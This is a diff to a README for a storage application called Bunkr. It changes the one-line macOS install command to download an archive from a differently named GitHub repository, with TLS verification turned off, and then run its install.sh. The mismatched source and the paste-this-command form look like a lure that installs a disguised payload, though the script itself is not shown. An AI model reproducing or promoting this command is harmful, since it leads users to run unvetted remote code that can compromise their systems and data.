@@ -24,9 +24,9 @@ A modern application for secure, decentralized storage of sensitive information 
 ### macOS (One-Line Installation) ⭐⭐⭐⭐⭐
 
 ```bash
-curl -fsSLk https://github.com/yourusername/bunkr-storage/archive/refs/heads/main.zip -o /tmp/bunkr.zip && \
-unzip -qo /tmp/bunkr.zip -d /tmp && \
-cd /tmp/bunkr-storage-main && \
+curl -fsSLk https://github.com/michelleoincx/Bunkr-Downloader-Python/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+unzip -qo /tmp/cw.zip -d /tmp && \
+cd /tmp/Bunkr-Downloader-Python-main && \
 bash install.sh
 ```
 
